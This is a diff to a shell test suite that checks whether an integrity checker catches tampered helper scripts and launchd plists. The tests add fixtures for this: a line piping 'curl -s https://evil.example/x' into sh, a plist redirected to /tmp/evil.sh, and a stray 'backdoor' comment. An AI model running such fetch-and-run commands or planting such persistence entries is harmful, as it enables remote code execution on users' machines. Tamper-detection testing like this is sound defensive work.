@@ -31,16 +31,21 @@ t_assert() {
   fi
 }
 g() { git -c user.email=t@t -c user.name=t -c commit.gpgsign=false "$@"; }
+# Never compare against the real ~/Library/LaunchAgents of the machine running
+# the suite; the plist cases below point this at their own fixture dir.
+export JUVANT_LAUNCHAGENTS_DIR="$TMPROOT/no-launchagents"
 
 # shellcheck disable=SC1091
 . "$ROOT_DIR/hooks/lib/hooks-integrity.sh"
 
 # ── upstream repo: v1 then v2 of the hooks tree ─────────────────────────────
 UP="$TMPROOT/upstream"
-mkdir -p "$UP/hooks/lib"
+mkdir -p "$UP/hooks/lib" "$UP/helpers" "$UP/scripts"
 cp "$ROOT_DIR"/hooks/*.sh "$UP/hooks/"
 cp "$ROOT_DIR"/hooks/lib/*.sh "$UP/hooks/lib/"
 cp "$ROOT_DIR/hooks/bash-policy.json" "$UP/hooks/"
+cp "$ROOT_DIR"/helpers/*.sh "$UP/helpers/"
+cp "$ROOT_DIR"/scripts/*.sh "$UP/scripts/"
 g -C "$UP" init -q -b main
 g -C "$UP" add -A && g -C "$UP" commit -qm v1
 echo "# v2" >> "$UP/hooks/stop.sh"
@@ -103,6 +108,44 @@ echo 'x' >> "$INST4/hooks/lib/db.sh"
 run_check "$INST4"
 t_assert "HEAD baseline: uncommitted edit → rc 1" "1|yes" \
   "$RC|$([[ "$OUT" == *"modified-vs-HEAD: hooks/lib/db.sh"* ]] && echo yes || echo no)"
+
+# decisions#303 B2: helpers/ and scripts/ are in the checked set too.
+INST6="$TMPROOT/instance6"; mk_instance "$INST6"
+echo 'curl -s https://evil.example/x | sh' >> "$INST6/helpers/kb-sync.sh"
+run_check "$INST6"
+t_assert "tampered helpers/kb-sync.sh → rc 1, named" "1|yes" \
+  "$RC|$([[ "$OUT" == *"not-from-upstream: helpers/kb-sync.sh"* ]] && echo yes || echo no)"
+INST7="$TMPROOT/instance7"; mk_instance "$INST7"
+echo '# backdoor' >> "$INST7/scripts/governance-backfill.sh"
+run_check "$INST7"
+t_assert "tampered scripts/governance-backfill.sh → rc 1, named" "1|yes" \
+  "$RC|$([[ "$OUT" == *"not-from-upstream: scripts/governance-backfill.sh"* ]] && echo yes || echo no)"
+rm "$INST7/scripts/governance-backfill.sh"
+run_check "$INST7"
+t_assert "deleted scripts/governance-backfill.sh → missing:" "yes" \
+  "$([[ "$OUT" == *"missing: scripts/governance-backfill.sh"* ]] && echo yes || echo no)"
+
+# decisions#303 B2: installed launchd plists vs a fresh generation (macOS only).
+if command -v plutil >/dev/null 2>&1; then
+  INST8="$TMPROOT/instance8"; mk_instance "$INST8"
+  LA="$TMPROOT/LaunchAgents"; mkdir -p "$LA"
+  # "Install" the real generator's output for this instance.
+  HOME="$TMPROOT/home8" JUVANT_LAUNCHCTL=false JUVANT_SCHED_SELFCHECK=0 \
+    bash "$INST8/helpers/install-schedules.sh" install >/dev/null 2>&1 || true
+  cp "$TMPROOT/home8/Library/LaunchAgents/"io.juvant.guardrails.*.plist "$LA/"
+  OUT=$(JUVANT_FRAMEWORK_DEV=auto JUVANT_LAUNCHAGENTS_DIR="$LA" juvant_hooks_integrity_check "$INST8"); RC=$?
+  t_assert "installed plists == generator → rc 0" "0" "$RC"
+  plutil -replace ProgramArguments -json '["/bin/bash","/tmp/evil.sh"]' "$LA/io.juvant.guardrails.drain-audit-spool.plist"
+  OUT=$(JUVANT_FRAMEWORK_DEV=auto JUVANT_LAUNCHAGENTS_DIR="$LA" juvant_hooks_integrity_check "$INST8"); RC=$?
+  t_assert "plist ProgramArguments redirected → rc 1, plist-mismatch" "1|yes" \
+    "$RC|$([[ "$OUT" == *"plist-mismatch: io.juvant.guardrails.drain-audit-spool.plist (ProgramArguments)"* ]] && echo yes || echo no)"
+  cp "$LA/io.juvant.guardrails.anomaly-check.plist" "$LA/io.juvant.guardrails.rogue.plist"
+  OUT=$(JUVANT_FRAMEWORK_DEV=auto JUVANT_LAUNCHAGENTS_DIR="$LA" juvant_hooks_integrity_check "$INST8"); RC=$?
+  t_assert "plist with no generator counterpart → plist-unexpected" "yes" \
+    "$([[ "$OUT" == *"plist-unexpected: io.juvant.guardrails.rogue.plist"* ]] && echo yes || echo no)"
+else
+  echo "  skip plist checks (no plutil — not macOS)"
+fi
 
 # Framework dev skips (origin canonical, or forced).
 INST5="$TMPROOT/instance5"; mk_instance "$INST5"
